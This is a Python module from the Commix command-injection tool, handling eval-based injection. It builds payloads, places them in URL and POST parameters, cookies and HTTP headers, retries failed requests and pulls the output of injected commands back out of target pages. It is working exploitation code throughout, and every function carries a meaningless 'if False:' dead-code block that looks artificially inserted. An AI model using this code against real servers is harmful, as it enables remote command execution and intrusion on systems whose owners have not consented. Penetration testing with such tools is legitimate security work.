"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import sys
import time
import json
import string
import random
from src.utils import menu
from src.utils import settings
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.results_based.techniques.eval_based import eb_payloads
'\nThe dynamic code evaluation (aka eval-based) technique.\n'
'\nCheck if target host is vulnerable.\n'

def injection_test(payload, http_request_method, url):
    if False:
        return 10
    if not settings.USER_DEFINED_POST_DATA:
        vuln_parameter = parameters.vuln_GET_param(url)
        target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(target)
        headers.do_check(request)
        response = requests.get_request_response(request)
    else:
        parameter = menu.options.data
        parameter = parameters.do_POST_check(parameter, http_request_method)
        parameter = ''.join((str(e) for e in parameter)).replace('+', '%2B')
        if settings.IS_JSON:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace('"', '\\"')))
            try:
                data = checks.json_data(data)
            except ValueError:
                pass
        elif settings.IS_XML:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
        else:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
        headers.do_check(request)
        vuln_parameter = parameters.vuln_POST_param(parameter, url)
        response = requests.get_request_response(request)
    return (response, vuln_parameter)
'\nEvaluate test results.\n'

def injection_test_results(response, TAG, randvcalc):
    if False:
        return 10
    if type(response) is bool and response != True or response is None:
        return False
    else:
        html_data = checks.page_encoding(response, action='decode')
        html_data = re.sub('\n', settings.SINGLE_WHITESPACE, html_data)
        if settings.SKIP_CALC:
            shell = re.findall('' + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE, html_data)
        else:
            shell = re.findall('' + TAG + settings.SINGLE_WHITESPACE + str(randvcalc) + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE, html_data)
        return shell
'\nCheck if target host is vulnerable. (Cookie-based injection)\n'

def cookie_injection_test(url, vuln_parameter, payload):
    if False:
        print('Hello World!')
    return requests.cookie_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (User-Agent-based injection)\n'

def user_agent_injection_test(url, vuln_parameter, payload):
    if False:
        while True:
            i = 10
    return requests.user_agent_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Referer-based injection)\n'

def referer_injection_test(url, vuln_parameter, payload):
    if False:
        print('Hello World!')
    return requests.referer_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Host-based injection)\n'

def host_injection_test(url, vuln_parameter, payload):
    if False:
        while True:
            i = 10
    return requests.host_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Custom header injection)\n'

def custom_header_injection_test(url, vuln_parameter, payload):
    if False:
        i = 10
        return i + 15
    return requests.custom_header_injection(url, vuln_parameter, payload)
'\nThe main command injection exploitation.\n'

def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
    if False:
        return 10

    def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
        if False:
            print('Hello World!')
        if alter_shell:
            payload = eb_payloads.cmd_execution_alter_shell(separator, TAG, cmd)
        else:
            payload = eb_payloads.cmd_execution(separator, TAG, cmd)
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)
        if ')%3B' + _urllib.parse.quote(')}') in payload:
            payload = payload.replace(')%3B' + _urllib.parse.quote(')}'), ')' + _urllib.parse.quote(')}'))
        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
        payload = checks.perform_payload_modification(payload)
        if settings.VERBOSITY_LEVEL != 0:
            debug_msg = "Executing the '" + cmd + "' command. "
            sys.stdout.write(settings.print_debug_msg(debug_msg))
            sys.stdout.flush()
            sys.stdout.write('\n' + settings.print_payload(payload) + '\n')
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
            response = cookie_injection_test(url, vuln_parameter, payload)
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
            response = user_agent_injection_test(url, vuln_parameter, payload)
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
            response = referer_injection_test(url, vuln_parameter, payload)
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
            response = host_injection_test(url, vuln_parameter, payload)
        elif settings.CUSTOM_HEADER_INJECTION:
            response = custom_header_injection_test(url, vuln_parameter, payload)
        elif not settings.USER_DEFINED_POST_DATA:
            target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
            vuln_parameter = ''.join(vuln_parameter)
            request = _urllib.request.Request(target)
            headers.do_check(request)
            response = requests.get_request_response(request)
        else:
            parameter = menu.options.data
            parameter = parameters.do_POST_check(parameter, http_request_method)
            parameter = ''.join((str(e) for e in parameter)).replace('+', '%2B')
            if settings.IS_JSON:
                data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace('"', '\\"')))
                try:
                    data = checks.json_data(data)
                except ValueError:
                    pass
            elif settings.IS_XML:
                data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
            else:
                data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
            request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
            headers.do_check(request)
            response = requests.get_request_response(request)
        return response
    response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    tries = 0
    while not response:
        if tries < menu.options.failed_tries / 2:
            response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
            tries = tries + 1
        else:
            err_msg = 'Something went wrong, the request has failed (' + str(tries) + ') times continuously.'
            sys.stdout.write(settings.print_critical_msg(err_msg) + '\n')
            raise SystemExit()
    return response
'\nCommand execution results.\n'

def injection_results(response, TAG, cmd):
    if False:
        print('Hello World!')
    new_line = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))
    html_data = checks.page_encoding(response, action='decode')
    html_data = re.sub('\n', new_line, html_data)
    shell = re.findall('' + TAG + new_line + TAG + '(.*)' + TAG + new_line + TAG + '', html_data)
    try:
        if len(re.split(TAG + '(.*)' + TAG, shell[0])) != 0:
            shell = re.findall('' + new_line + '(.*)' + new_line + '', re.split(TAG + '(.*)' + TAG, re.split(TAG + '(.*)' + TAG, shell[0])[0])[0])
        shell = shell[0].replace(new_line, '\n').rstrip().lstrip()
    except IndexError:
        pass
    return shell